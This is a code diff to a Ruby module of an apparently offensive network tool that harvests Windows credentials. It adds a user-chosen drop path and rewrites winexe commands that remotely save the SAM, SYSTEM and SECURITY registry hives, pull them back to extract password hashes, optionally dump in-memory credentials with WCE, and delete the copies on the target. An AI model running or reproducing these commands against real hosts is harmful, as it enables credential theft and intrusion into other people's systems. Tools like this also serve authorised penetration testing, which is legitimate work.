@@ -28,6 +28,24 @@ class HashesWorkstation < Poet::Scanner
 			end
 		end
 
+    @drop_path = ''
+    # Get valid path
+    while true
+      print "Enter the Path to save temporary files [#{color_banner('%TEMP%')}] : "
+      @drop_path = rgets
+      if @drop_path =~ /^[a-zA-Z:\\|%]/
+        break
+      elsif @drop_path.empty?
+        @drop_path = "%TEMP%"
+        break
+      else
+        print_bad('Valid path required (EX: C:\\temp\\')
+      end
+    end
+
+    puts
+    @drop_path.chomp('\\')
+
 		@hashes = {}
 	end
 
@@ -37,19 +55,21 @@ class HashesWorkstation < Poet::Scanner
 		create_folder("#{@log}/hashes/#{host}") unless folder_exists("#{@log}/hashes/#{host}")
 		
 		# dump local hashes
-		# export sam, system, security into %TEMP%
+		# export sam, system, security
 		smboptions = "--system //#{host}"
 		clientoptions = "//#{host}/c$ -c"
 
-		hashes = winexe(smboptions, "CMD /C reg.exe save HKLM\\SAM %TEMP%\\sam && reg.exe save HKLM\\SYSTEM %TEMP%\\sys && reg.exe save HKLM\\SECURITY %TEMP%\\sec")
+		hashes = winexe(smboptions, "CMD /C reg.exe save HKLM\\SAM #{@drop_path}\\sam && reg.exe save HKLM\\SYSTEM #{@drop_path}\\sys && reg.exe save HKLM\\SECURITY #{@drop_path}\\sec")
 		# Check if sam dump successful
 
 		temp_directory = ''
-		3.times do
-			temp_directory = winexe(smboptions, "CMD /C echo %TEMP%").chomp
-			break unless temp_directory.empty?
-			sleep 3
-		end
+    if @drop_path[0,1].eql? '%'
+      3.times do
+        temp_directory = winexe(smboptions, "CMD /C echo #{@drop_path}").chomp
+        break unless temp_directory.empty?
+        sleep 3
+      end
+    end
 
 		temp_directory.gsub!('C:', '') if temp_directory
 
@@ -76,7 +96,7 @@ class HashesWorkstation < Poet::Scanner
 
 		# cleanup hashes on the remote system
 		winexe = "--uninstall #{winexe}" unless @wce
-		cleanup = winexe(smboptions, "CMD /C del %TEMP%\\sam %TEMP%\\sys %TEMP%\\sec")
+		cleanup = winexe(smboptions, "CMD /C del #{@drop_path}\\sam #{@drop_path}\\sys #{@drop_path}\\sec")
 
 		# validate hives exist locally
 		if file_exists?("#{@log}/hashes/#{host}/sam")
@@ -107,7 +127,7 @@ class HashesWorkstation < Poet::Scanner
 			end
 			has_hashes = true
 		rescue
-			vprint_bad("#{host.ljust(15)} - Issues extracing hashes from hives")
+			vprint_bad("#{host.ljust(15)} - Issues extracting hashes from hives")
 		end
 
     # insert hashdump to database
@@ -150,7 +170,7 @@ class HashesWorkstation < Poet::Scanner
       wcedump = ''
 		# Dump with WCE if set in config
 		if @wce
-			wcedump = wce(username, password, host)
+			wcedump = wce(username, password, host, @drop_path)
 			if wcedump.to_s.lines.count > 0
 				full_print_line << "#{highlight(wcedump.lines.count)} in Memory".ljust(10)
 			else
